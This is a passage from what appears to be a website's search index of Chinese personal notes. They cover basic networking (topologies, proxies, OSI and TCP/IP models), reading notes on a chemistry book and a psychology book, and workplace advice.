\u5176\u4ed6"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#2-nic","title":"2\u3001\u8282\u70b9-\u7f51\u7edc\u63a5\u53e3\u63a7\u5236\u5668(NIC)","text":"<p>\u7f51\u7edc\u8282\u70b9\u662f\u4ecb\u8d28(\u786c\u4ef6)\u4e2d\u7535\u3001\u5149\u6216\u65e0\u7ebf\u7535\u4fe1\u53f7\u7684\u53d1\u5c04\u5668\u548c\u63a5\u6536\u5668\u3002\u7528\u4e8e\u8fde\u63a5\u5230\u8ba1\u7b97\u673a\u7ec4\u6210\u7f51\u7edc\uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u7f51\u7edc\u8282\u70b9\u8bbe\u5907\u540d\u79f0\u3002</p> \u4e2d\u7ee7\u5668 Hubs(\u96c6\u7ebf\u5668) Bridges(\u7f51\u6865) Switches(\u4ea4\u6362\u673a) \u8def\u7531\u5668/\u5149\u732b \u7f51\u5173 \u9632\u706b\u5899"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#3","title":"3\u3001\u7c7b\u578b\u533a\u5206","text":"<p>\u7f51\u7edc\u62d3\u6251\u5206\u4e3a\u4ee5\u4e0b\u516b\u79cd\u57fa\u672c\u7c7b\u578b</p> \u70b9\u5230\u70b9 \u603b\u7ebf\u578b \u661f\u578b \u73af\u578b \u7f51\u683c\u578b \u6811\u578b \u6df7\u5408\u578b \u83ca\u82b1\u94fe <p>\u590d\u6742\u7684\u7f51\u7edc\u62d3\u6251\u53ef\u80fd\u5b58\u5728\u4e0a\u8ff0\u4e24\u79cd\u4ee5\u4e0a\u7684\u6df7\u5408\u4f53\u5f62\u5f0f</p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_6","title":"\u70b9\u5230\u70b9","text":"<p>\u6700\u7b80\u5355\u7684\u62d3\u6251\u7ed3\u6784\uff0c\u7ec4\u6210\u4e00\u4e2a\u6700\u5c0f\u7684\u5c40\u57df\u7f51</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_7","title":"\u603b\u7ebf","text":"<p>\u540c\u65f6\u53ea\u80fd\u6709\u4e00\u53f0\u4e3b\u673a\u53d1\u9001\u6570\u636e\uff0c\u5176\u4ed6\u4e3b\u673a\u786e\u8ba4\u662f\u5426\u63a5\u6536\u6570\u636e\u3002\u6839\u636eIP\u5730\u5740\u548cMAC\u5730\u5740\u5224\u65ad</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_8","title":"\u661f\u578b\u62d3\u6251","text":"<p>\u6240\u6709\u7684\u6570\u636e\u5305\u90fd\u4f1a\u7ecf\u8fc7\u4e2d\u95f4\u7684\u7f51\u7edc\u8282\u70b9\u8bbe\u5907\uff0c\u7ecf\u8fc7\u5b83\u5728\u8f6c\u53d1\u5230\u76ee\u7684\u5730\u3002</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_9","title":"\u73af\u578b","text":"<p>\u4e0d\u9700\u8981\u6709\u7f51\u7edc\u8282\u70b9\u8bbe\u5907</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_10","title":"\u7f51\u683c\u578b","text":"<p>\u6ca1\u6709\u56fa\u5b9a\u7684\u62d3\u6251\u7ed3\u6784\u3002\u4ece\u57fa\u672c\u6982\u5ff5\u6765\u770b\u4e00\u79cd\u662f\u5168\u7f51\u72b6\u7ed3\u6784\uff0c\u4e00\u79cd\u662f\u90e8\u5206\u7f51\u72b6\u7ed3\u6784\u3002\u6bcf\u53f0\u4e3b\u673a\u90fd\u4f1a\u4ee5\u5168\u7f51\u72b6\u7ed3\u6784\u8fde\u63a5\u5230\u7f51\u7edc\u4e2d\u7684\u6240\u6709\u5176\u4ed6\u4e3b\u673a\u3002\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u91cd\u8981\u7684\u7f51\u7edc\u8bbe\u5907\u8def\u7531\u5668\u53d1\u751f\u6545\u969c\uff0c\u5176\u4ed6\u8def\u7531\u5668\u4e5f\u53ef\u7ee7\u7eed\u5de5\u4f5c\u800c\u4e0d\u4f1a\u4f7f\u7f51\u7edc\u762b\u75ea\u3002</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_11","title":"\u6811\u578b","text":"<p>\u672c\u5730\u7f51\u7edc\u4e2d\u6700\u5e38\u89c1\u7684\u7f51\u7edc\u7ed3\u6784\uff0c\u662f\u6269\u5c55\u7684\u661f\u578b\u7ed3\u6784\u3002</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_12","title":"\u6df7\u5408\u578b","text":"<p>\u7ed3\u5408\u4e86\u4e24\u79cd\u6216\u591a\u79cd\u62d3\u6251\u7ed3\u6784\uff0c\u56e0\u6b64\u751f\u6210\u7684\u7f51\u7edc\u4e0d\u5448\u73b0\u4efb\u4f55\u6807\u51c6\u62d3\u6251\u7ed3\u6784\u3002\u5f53\u4e24\u4e2a\u4e0d\u540c\u7684\u57fa\u672c\u7f51\u7edc\u62d3\u6251\u4e92\u8054\u65f6\uff0c\u603b\u662f\u4f1a\u521b\u5efa\u6df7\u5408\u62d3\u6251\u3002</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_13","title":"\u83ca\u82b1\u94fe","text":"<p>\u591a\u53f0\u4e3b\u673a\u4e4b\u95f4\u4ece\u4e00\u7aef\u8282\u70b9\u7528\u4e00\u6839\u7535\u7f06\u8fde\u63a5\u5230\u53e6\u4e00\u7aef\u8282\u70b9</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_14","title":"\u4ee3\u7406","text":"<p>\u5f88\u591a\u4eba\u5bf9\u4ee3\u7406\u6709\u4e0d\u540c\u770b\u6cd5</p> <p>\u5b89\u5168\u4ece\u4e1a\u8005\u7ecf\u5e38\u5229\u7528http\u4ee3\u7406\u6293\u53d6\u4e0e\u670d\u52a1\u5668\u4ea4\u4e92\u7684\u6570\u636e</p> <p>web\u5f00\u53d1\u4eba\u5458\u4f7f\u7528Cloudflare\u7b49\u4ee3\u7406\u963b\u6b62\u6076\u610f\u6d41\u91cf</p> <p>\u666e\u901a\u7528\u6237\u53ef\u80fd\u8ba4\u4e3a\u4ee3\u7406\u7528\u4e8e\u6df7\u6dc6\u5f53\u524d\u6240\u5728\u4f4d\u7f6e\u5e76\u8bbf\u95ee\u5176\u4ed6\u56fd\u5bb6/\u5730\u533a\u7684\u8d44\u6e90\u3002</p> <p>\u6267\u6cd5\u90e8\u95e8\u7ecf\u5e38\u5c06\u4ee3\u7406\u8ba4\u4e3a\u662f\u975e\u6cd5\u6d3b\u52a8\u3002</p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_15","title":"\u539f\u7406\uff1a","text":"<p>\u4ee3\u7406\u662f\u4f4d\u4e8e\u8bbe\u5907\u6216\u670d\u52a1\u8fde\u63a5\u4e2d\u5145\u5f53\u4e2d\u95f4\u4eba\uff0c\u5e76\u4e14\u80fd\u591f\u68c0\u67e5\u6d41\u91cf\u7684\u5185\u5bb9\u3002\u5982\u679c\u6ca1\u6709\u68c0\u67e5\u6d41\u91cf\u5185\u5bb9\u7684\u80fd\u529b\uff0c\u90a3\u4e48\u5b83\u5c31\u662f\u4e00\u4e2a\u7f51\u5173\u8bbe\u5907\uff0c\u800c\u4e0d\u662f\u4ee3\u7406\u3002</p> <p>\u4ee3\u7406\u51e0\u4e4e\u603b\u662f\u5728 OSI \u6a21\u578b\u7684\u7b2c7\u5c42\u8fd0\u884c\u3002\u4e3b\u8981\u5206\u4e3a\u4ee5\u4e0b\u51e0\u79cd\uff1a</p> <ul> <li> <p>\u4e13\u7528\u4ee3\u7406/\u8f6c\u53d1\u4ee3\u7406</p> </li> <li> <p>\u53cd\u5411\u4ee3\u7406</p> </li> <li> <p>\u900f\u660e\u4ee3\u7406</p> </li> </ul>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_16","title":"\u7f51\u7edc\u5de5\u4f5c\u6d41\u7a0b","text":""},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_17","title":"\u7f51\u7edc\u6a21\u578b","text":"<p>\u5171\u6709\u4e24\u79cd\u7f51\u7edc\u6a21\u578b\u63cf\u8ff0\u4e86\u4ece\u4e00\u53f0\u4e3b\u673a\u5230\u53e6\u4e00\u53f0\u4e3b\u673a\u7684\u6570\u636e\u901a\u4fe1\u548c\u4f20\u8f93\uff0c\u79f0\u4e3a <code>ISO/OSI \u6a21\u578b</code> \u548c <code>TCP/IP \u6a21\u578b</code>\uff0c\u662f\u8ba9\u6211\u4eec\u7528\u6765\u6807\u51c6\u5316\u7f51\u7edc\u534f\u8bae\uff0c\u66f4\u76f4\u89c2\u4e86\u89e3\u7f51\u7edc\u7684\u4f20\u8f93\u8fc7\u7a0b\u3002</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#osi","title":"OSI \u6a21\u578b","text":"<p>\u901a\u5e38\u79f0\u4e3a ISO/OSI\u5c42\u6a21\u578b\uff0c\u662f\u4e00\u79cd\u53ef\u7528\u4e8e\u63cf\u8ff0\u548c\u5b9a\u4e49\u7cfb\u7edf\u95f4\u901a\u4fe1\u7684\u53c2\u8003\u6a21\u578b\u3002\u53c2\u8003\u6a21\u578b\u6709\u4e03\u4e2a\u5355\u72ec\u7684\u5c42\uff0c\u6bcf\u4e2a\u5c42\u90fd\u6709\u660e\u786e\u5206\u79bb\u7684\u4efb\u52a1\u3002 OSI \u4e00\u8bcd\u4ee3\u8868\u5f00\u653e\u7cfb\u7edf\u4e92\u8fde\u6a21\u578b\uff0c\u7531\u56fd\u9645\u7535\u4fe1\u8054\u76df (ITU) \u548c\u56fd\u9645\u6807\u51c6\u5316\u7ec4\u7ec7 (ISO) \u53d1\u5e03\u3002\u56e0\u6b64\uff0cOSI\u6a21\u578b\u5e38\u88ab\u79f0\u4e3aISO/OSI\u5c42\u6a21\u578b\u3002</p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#tcpip","title":"TCP/IP \u6a21\u578b","text":"<p>TCP/IP\uff08\u4f20\u8f93\u63a7\u5236\u534f\u8bae/\u7f51\u9645\u534f\u8bae\uff09\u662f\u8bb8\u591a\u7f51\u7edc\u534f\u8bae\u7684\u603b\u79f0\u3002\u8fd9\u4e9b\u534f\u8bae\u8d1f\u8d23 Internet \u4e0a\u6570\u636e\u5305\u7684\u4ea4\u6362\u548c\u4f20\u8f93\u3002 Internet \u5b8c\u5168\u57fa\u4e8e TCP/IP \u534f\u8bae\u65cf\u3002\u4f46\u662f\uff0cTCP/IP \u4e0d\u4ec5\u6307\u8fd9\u4e24\u4e2a\u534f\u8bae\uff0c\u800c\u4e14\u901a\u5e38\u7528\u4f5c\u6574\u4e2a\u534f\u8bae\u7cfb\u5217\u7684\u901a\u7528\u672f\u8bed\u3002 \u4f8b\u5982\uff0cICMP\uff08Internet Control Message Protocol\uff09\u6216UDP\uff08User Datagram Protocol\uff09\u5c31\u5c5e\u4e8e\u8be5\u534f\u8bae\u65cf\u3002\u534f\u8bae\u65cf\u63d0\u4f9b\u4e86\u5728\u4e13\u7528\u6216\u516c\u5171\u7f51\u7edc\u4e2d\u4f20\u8f93\u548c\u4ea4\u6362\u6570\u636e\u5305\u7684\u5fc5\u8981\u529f\u80fd\u3002</p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#osi-tcpip","title":"OSI \u6a21\u578b\u5bf9\u6bd4 TCP/IP \u6a21\u578b","text":"<p>TCP/IP \u662f\u4e00\u79cd\u5141\u8bb8\u4e3b\u673a\u8fde\u63a5\u5230 Internet \u7684\u901a\u4fe1\u534f\u8bae\u3002\u5b83\u6307\u7684\u662f Internet \u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u4f20\u8f93\u63a7\u5236\u534f\u8bae\u3002\u4e0e OSI \u76f8\u6bd4\uff0c\u5b83\u5141\u8bb8\u7b80\u5316\u5fc5\u987b\u9075\u5faa\u7684\u89c4\u5219\uff0c\u524d\u63d0\u662f\u9075\u5faa\u4e00\u822c\u51c6\u5219\u3002 \u53e6\u4e00\u65b9\u9762\uff0cOSI \u662f\u7f51\u7edc\u548c\u6700\u7ec8\u7528\u6237\u4e4b\u95f4\u7684\u901a\u4fe1\u7f51\u5173\u3002 OSI \u6a21\u578b\u901a\u5e38\u88ab\u79f0\u4e3a\u53c2\u8003\u6a21\u578b\uff0c\u56e0\u4e3a\u5b83\u6bd4\u8f83\u8001\u3002\u5b83\u8fd8\u4ee5\u5176\u4e25\u683c\u7684\u534f\u8bae\u548c\u9650\u5236\u800c\u95fb\u540d\u3002</p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_18","title":"\u6570\u636e\u5305\u4f20\u8f93","text":"<p>\u5728\u5206\u5c42\u7cfb\u7edf\u4e2d\uff0c\u5c42\u4e2d\u7684\u8bbe\u5907\u4ee5\u79f0\u4e3a\u534f\u8bae\u6570\u636e\u5355\u5143(PDU)\u7684\u4e0d\u540c\u683c\u5f0f\u4ea4\u6362\u6570\u636e\u3002\u4f8b\u5982\uff0c\u5f53\u6211\u4eec\u8981\u5728\u7535\u8111\u4e0a\u6d4f\u89c8\u4e00\u4e2a\u7f51\u7ad9\u65f6\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u9996\u5148\u5c06\u8bf7\u6c42\u7684\u6570\u636e\u4f20\u9012\u7ed9\u5e94\u7528\u5c42\u3002\u5b83\u662f\u9010\u5c42\u5904\u7406\u7684\uff0c\u6bcf\u4e00\u5c42\u90fd\u6267\u884c\u5176\u6307\u5b9a\u7684\u529f\u80fd\u3002\u7136\u540e\u6570\u636e\u901a\u8fc7\u7f51\u7edc\u7684\u7269\u7406\u5c42\u4f20\u8f93\uff0c\u76f4\u5230\u76ee\u6807\u670d\u52a1\u5668\u6216\u5176\u4ed6\u8bbe\u5907\u63a5\u6536\u5230\u5b83\u3002\u6570\u636e\u518d\u6b21\u901a\u8fc7\u5404\u5c42\u8def\u7531\uff0c\u6bcf\u4e00\u5c42\u6267\u884c\u5176\u5206\u914d\u7684\u64cd\u4f5c\uff0c\u76f4\u5230\u63a5\u6536\u8f6f\u4ef6\u4f7f\u7528\u6570\u636e\u3002</p> <p></p>"},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#osi_1","title":"OSI \u6a21\u578b","text":""},{"location":"%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#tcpip_1","title":"TCP/IP \u6a21\u578b","text":"<p>\u4f20\u8f93\u534f\u8bae\uff0c\u7f51\u7ebf\uff0cIP\u5730\u5740\uff0cMAC\u5730\u5740\uff0c</p> <p>\u8f6f\u4ef6\uff1a\u7f16\u7a0b </p>"},{"location":"%E9%98%85%E8%AF%BB/%E3%80%8A%E5%8C%96%E5%AD%A6%E4%B9%8B%E4%B9%A6%E3%80%8B-%20%E5%BE%B7%E9%87%8C%E5%85%8B%20%C2%B7%20B.%E7%BD%97%E5%A8%81/","title":"\u300a\u5316\u5b66\u4e4b\u4e66\u300b  \u5fb7\u91cc\u514b \u00b7 B.\u7f57\u5a01","text":"<pre><code>\u7535\u5b50\u3001\u8d28\u5b50\u548c\u4e2d\u5b50\u6784\u6210\u539f\u5b50--\u8fd9\u662f\u7269\u7406\u5b66\u7684\u8303\u7574\u3002\u4e00\u65e6\u539f\u5b50\u4eec\u952e\u548c\u5728\u4e00\u8d77\u5f62\u6210\u4e86\u5206\u5b50\uff0c\u90a3\u5c31\u8de8\u5165\u4e86\u5316\u5b66\u7684\u201c\u5730\u754c\u201d\u3002\n\u5316\u5b66\u662f\u81ea\u7136\u79d1\u5b66\u7684\u57fa\u7840\u6027\u5b66\u79d1\n\u5728\u6240\u6709\u5b66\u79d1\u4e2d\uff0c\u5316\u5b66\u5904\u4e8e\u201c\u4e2d\u5fc3\u79d1\u5b66\u201d\u7684\u5730\u4f4d\n</code></pre> <p>\u4ec0\u4e48\u662f\u5316\u5b66</p> <p>\u8d28\u91cf\u5b88\u6052\u5b9a\u5f8b \u5316\u5b66\u53cd\u5e94\u4e2d\uff0c\u53c2\u52a0\u53cd\u5e94\u7684\u5404\u79cd\u7269\u8d28\u7684\u8d28\u91cf\u603b\u548c\u7b49\u4e8e\u53cd\u5e94\u540e\u751f\u6210\u5404\u7269\u8d28\u7684\u8d28\u91cf\u603b\u548c</p> <p>\u8bd1\u8005\u540e\u8bb0 \u8981\u5c06\u4e00\u95e8\u77e5\u8bc6\u5b66\u900f\u5b66\u7cbe\uff0c\u9700\u6293\u4f4f\u4e24\u53ea\u201c\u725b\u8033\u6735\u201d\uff0c\u524d\u4e16\u4eca\u751f\u3001\u5177\u4f53\u5206\u652f \u4ece\u65f6\u95f4\u7ef4\u5ea6\u6a2a\u5411\u53bb\u4e86\u89e3\u4e00\u95e8\u5b66\u79d1\uff0c\u80fd\u77e5\u9053\u5b83\u7684\u53d1\u5c55\u8109\u7edc\uff0c\u77e5\u5176\u7136\u77e5\u5176\u6240\u4ee5\u7136 \u901a\u8fc7\u7eb5\u5411\u6bd4\u8f83\u5b66\u79d1\u7684\u5404\u5206\u652f\uff0c\u53ef\u4ee5\u627e\u5230\u5176\u5171\u6709\u7684\u89c4\u5f8b\u3001\u8054\u7cfb\u3001\u548c\u5f02\u540c\uff0c\u901a\u8fc7\u6bd4\u8f83\uff0c\u6743\u8861\u4f18\u52a3\uff0c\u603b\u8ba1\u7ecf\u9a8c \u4e00\u7eb5\u4e00\u6a2a\uff0c\u8be5\u5b66\u79d1\u4f53\u7cfb\u4e86\u7136\u4e8e\u80f8\uff0c\u7ec8\u6709\u4e00\u65e5\u4f1a\u8fbe\u5230\u201c\u4e00\u89c8\u4f17\u5c71\u5c0f\u201d\u201c\u5927\u9053\u81f3\u7b80\uff0c\u6b8a\u9014\u540c\u5f52\u201d\u7684\u5883\u754c</p>"},{"location":"%E9%98%85%E8%AF%BB/%E3%80%8A%E8%9B%A4%E8%9F%86%E5%85%88%E7%94%9F%E7%9C%8B%E5%BF%83%E7%90%86%E5%8C%BB%E7%94%9F%E3%80%8B/","title":"\u300a\u86e4\u87c6\u5148\u751f\u770b\u5fc3\u7406\u533b\u751f\u300b","text":"<p>\u4eba\u683c\u7ed3\u6784</p> <p>\u5b69\u7ae5\u72b6\u6001</p> <p>\u7236\u6bcd\u72b6\u6001</p> <p>\u6210\u4eba\u72b6\u6001</p> <p>\u5982\u4f55\u7231\u81ea\u5df1</p> <p>\u81ea\u6211\u6d1e\u5bdf\u529b\u3001\u60c5\u5546</p>"},{"location":"%E9%98%85%E8%AF%BB/%E4%B8%89%E8%81%94%E7%94%9F%E6%B4%BB%E5%91%A8%E5%88%8A/","title":"\u4e09\u8054\u751f\u6d3b\u5468\u520a","text":"<p>\u751f\u6d3b</p> <p>\u6210\u957f</p> <p>\u5de5\u4f5c\uff1a\u5904\u7406\u7efc\u5408\u4e8b\u52a1\u7684\u80fd\u529b</p> <p>\u4e09\u8054\u5468\u520a\uff1a\u4eba\u751f\u662f\u65f7\u91ce\u7684\u4e00\u9762\uff0c\u4e0d\u7528\u8fc7\u4e8e\u8ffd\u6c42\u773c\u524d\u7684\u77ed\u671f\u4e8b\u7269\u7684\u786e\u5b9a\u6027\uff0c\u6709\u80fd\u529b\u548c\u52c7\u6c14\u9762\u5bf9\u66f4\u5e7f\u6cdb\u7684\u5929\u7a7a\u548c\u66f4\u5e7f\u6cdb\u7684\u4eba\u751f\uff0c\u8fd9\u624d\u662f\u4eba\u751f\u6700\u6709\u610f\u4e49\u7684\u63a2\u7d22</p> <p>00\u540e\u6c42\u804c N\u9053\u574e</p> <p>\u6211\u4eec\u6700\u591a\u5143\u7684\u672a\u6765 \u538b\u529b\uff1a\u5c31\u4e1a \u623f\u5c4b \u6210\u5bb6</p> <p>\u7ecf\u6d4e\uff1f\u7a33\u5b9a\u7684\u4f53\u5236 \u653f\u5e9c\u673a\u5173\u3001\u56fd\u4f01\u3001\u4e8b\u4e1a\u5355\u4f4d\u3001\u9ad8\u6821\u3002</p> <p>\u653b\u7565 VS \u63a2\u7d22</p> <p>\u5174\u8bb8\u57fa\u7840\u4e0e\u804c\u4e1a\u53d1\u5c55 \u73b0\u4ee3\u793e\u4f1a \u4eba\u53d1\u5c55\u6ede\u540e</p>"},{"location":"%E9%98%85%E8%AF%BB/%E8%81%8C%E5%9C%BA%E6%98%AF%E4%B8%AA%E6%8A%80%E6%9C%AF%E6%B4%BB%E7%AC%94%E8%AE%B0/%E8%81%8C%E5%9C%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/","title":"\u804c\u573a\u6280\u672f\u5fc3\u5f97","text":"<p>\u770b\u4e86\u540e\u6700\u5927\u7684\u611f\u60f3\u5c31\u662f\u539f\u6765\u804c\u573a\u8fd8\u6709\u8fd9\u4e48\u591a\u5b66\u95ee</p>"},{"location":"%E9%98%85%E8%AF%BB/%E8%81%8C%E5%9C%BA%E6%98%AF%E4%B8%AA%E6%8A%80%E6%9C%AF%E6%B4%BB%E7%AC%94%E8%AE%B0/%E8%81%8C%E5%9C%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/#_2","title":"\u804c\u573a\u91cd\u8981\u5b88\u5219","text":"<p>\u5b88\u65f6</p> <p>\u63a5\u5230\u4e00\u4e2a\u4efb\u52a1\u540e\uff0c\u5bf9\u4e0d\u6e05\u695a\u7684\u65b9\u9762\u8981\u63d0\u524d\u505a\u597d\u6709\u6548\u6c9f\u901a</p> <p>\u4e0d\u8981\u968f\u4fbf\u5360\u7528\u522b\u4eba\u7684\u8d44\u6e90</p> <p>\u7ad9\u9ad8\u4e24\u7ea7\u770b\u95ee\u9898\uff0c\u7ad9\u4f4e\u4e24\u7ea7\u505a\u4e8b\u60c5\u3002</p>"},{"location":"%E9%98%85%E8%AF%BB/%E8%81%8C%E5%9C%BA%E6%98%AF%E4%B8%AA%E6%8A%80%E6%9C%AF%E6%B4%BB%E7%AC%94%E8%AE%B0/%E8%81%8C%E5%9C%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/#_3","title":"\u91cd\u8981\u80fd\u529b","text":"<p>\u60c5\u7eea\u7ba1\u7406\uff0c\u60c5\u7eea\u53d1\u73b0\u53ea\u4f1a\u81ea\u5df1\u5e26\u6765\u4e0d\u597d\u7684\u4ee3\u4ef7</p> <p>\u5b66\u4e60\u80fd\u529b\uff0c\u5b66\u5386\u540e\u9762\u91cd\u8981\u7684\u662f\u5b66\u4e60\u80fd\u529b</p> <p>\u6001\u5ea6\u7aef\u6b63 \u53ef\u4ee5\u83b7\u53d6\u66f4\u591a\u673a\u4f1a\uff0c\u522b\u4eba\u66f4\u613f\u610f\u6559\u4f60</p> <p>\u200b   \u804c\u573a\u4eba\u6700\u559c\u6b22\u7684\u4e00\u4e2a\u54c1\u884c \u806a\u660e\u4e14\u8c26\u5351</p> <p>\u4e0d\u6015\u72af\u9519 \u5c3d\u7ba1\u505a \u9519\u4e86\u5c31\u6539\u6b63 \u7ed9\u81ea\u5df1\u4e00\u4e9b\u8bd5\u9519\u7a7a\u95f4</p> <p>\u7f57\u7965</p> <p>\u505a\u597d\u6700\u57fa\u7840\u7684\u4e8b\u60c5\uff0c\u5c31\u6709\u53ef\u80fd\u628a\u5730\u57fa\u6253\u624e\u5b9e\uff0c\u624d\u80fd\u5efa\u7684\u66f4\u9ad8</p> <p>\u6240\u6709\u7684\u771f\u7406\u90fd\u662f\u9648\u8bcd\u6ee5\u8c03\uff0c\u4eba\u751f\u6ca1\u6709\u65b0\u7684\u4e1c\u897f</p> <p>\u8d75\u9e4f</p> <p>\u804c\u573a\u6700\u57fa\u672c\u7684\u6587\u660e\uff0c\u4e0d\u7ed9\u522b\u4eba\u5e73\u6dfb\u9ebb\u70e6</p> <p>\u4e00\u4e2a\u6ca1\u6709\u5f53\u8fc7\u9500\u552e\u51a0\u519b\u7684\u4e2d\u5e74\u4eba\u76f8\u518c\u91cc\uff0c\u662f\u7f3a\u5c11\u5149\u8292\u7684</p> <p>\ud83c\udf1f\u60f3\u529e\u6cd5\u8ba9\u522b\u4eba\u7406\u89e3\u4f60\u7684\u610f\u601d\uff0c\u4e5f\u8981\u60f3\u529e\u6cd5\u53bb\u660e\u767d\u522b\u4eba\u7684\u610f\u601d</p> <p>\u804c\u573a\u6ca1\u6709\u8f93\u8d62\uff0c\u8981\u4e48\u53cc\u8d62\uff0c\u8981\u4e48\u53cc\u8f93\u3002</p> <p>\u4eba\u6709\u65f6\u4f1a\u5fd8\u8bb0\u81ea\u5df1\u6700\u521d\u60f3\u8981\u7684\u4e1c\u897f\uff0c\u6700\u6015\u65e2\u8981\uff0c\u4e5f\u8981\uff0c\u8fd8\u8981\u3002</p> <p>\u4eba\u7684\u81ea\u4fe1\u548c\u81ea\u5351\u662f\u6210\u6b63\u6bd4\u7684\uff0c\u8868\u9762\u8d8a\u662f\u81ea\u4fe1\u7684\u4eba\uff0c\u5f80\u5f80\u662f\u4e3a\u4e86\u63a9\u9970\u9aa8\u5b50\u91cc\u7684\u81ea\u5351\u3002\u3001</p> <p>\u6293\u4f4f\u4e8b\u60c5\u7684\u672c\u8d28</p> <p>\u804c\u573a\u4e0a\u6700\u5feb\u7684\u63d0\u5347\u65b9\u6cd5\uff0c\u5411\u4f18\u79c0\u7684\u4eba\u5b66\u4e60 \u8ba8\u6559</p> <p>\u7ec6\u8282\u51b3\u5b9a\u6210\u8d25</p>"},{"location":"%E9%98%85%E8%AF%BB/%E8%81%8C%E5%9C%BA%E6%98%AF%E4%B8%AA%E6%8A%80%E6%9C%AF%E6%B4%BB%E7%AC%94%E8%AE%B0/%E8%81%8C%E5%9C%BA%E6%8A%80%E6%9C%AF%E5%BF%83%E5%BE%97/#_4","title":"\u5982\u4f55\u6c47\u62a5\u5de5\u4f5c","text":"<p>\u6700\u5bb9\u6613\u72af\u7684\u9519\u8bef</p> <p>\u8981\u4e48\u8bdd\u592a\u591a\uff0c\u8981\u4e48\u8bdd\u592a\u5c11\u3002\u6700\u6015\u8bcd\u4e0d\u8fbe\u610f\uff0c\u6d6a\u8d39\u522b\u4eba\u65f6\u95f4\u3002</p> <p>\u4f7f\u7528PPT\u5f62\u5f0f\u8981\u5199\u597d\u9010\u5b57\u7a3f\uff0c\u5982\u679c\u8981\u5373\u5174\u53d1\u6325\uff0c\u6700\u597d\u5efa\u7acb\u5728\u9010\u5b57\u7a3f\u7684\u57fa\u7840\u4e4b\u4e0a\u3002</p>"}]}